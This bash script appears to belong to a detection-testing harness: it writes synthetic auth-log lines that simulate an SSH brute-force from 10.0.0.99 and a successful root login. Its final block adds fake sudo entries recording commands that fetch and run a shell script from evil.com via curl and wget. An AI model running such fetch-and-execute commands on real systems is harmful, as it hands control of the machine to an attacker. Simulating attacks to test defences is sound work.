#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/orchestrator.conf"
source "$SCRIPT_DIR/inject-common.sh"

ATTACKER_IP="10.0.0.99"
COUNT=$(get_attack_lines)
PORT=$((RANDOM % 50000 + 10000))
USERS=("root" "admin" "ubuntu" "www-data" "deploy")

# Failed attempts with invalid users
for ((i=0; i<COUNT/2; i++)); do
    user="${USERS[$((RANDOM % ${#USERS[@]}))]}"
    inject_auth "$AGENTS_SHARED" "sshd[${PORT}]: Failed password for invalid user ${user} from ${ATTACKER_IP} port $((PORT + i)) ssh2"
done

# Failed attempts with valid user wrong password
for ((i=0; i<COUNT/3; i++)); do
    inject_auth "$AGENTS_SHARED" "sshd[${PORT}]: Failed password for root from ${ATTACKER_IP} port $((PORT + i + 100)) ssh2"
done

# Successful login
inject_auth "$AGENTS_SHARED" "sshd[${PORT}]: Accepted password for root from ${ATTACKER_IP} port $((PORT + 999)) ssh2"

# Post-login sudo
inject_auth "$AGENTS_SHARED" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'curl http://evil.com/shell.sh | bash'"
inject_auth "$AGENTS_SHARED" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget -O /tmp/shell http://evil.com/shell.sh"
inject_auth "$AGENTS_SHARED" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/shell"
inject_auth "$AGENTS_SHARED" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/tmp/shell"

log_orch "scenario=ssh-brute lines=${COUNT} attacker=${ATTACKER_IP}"
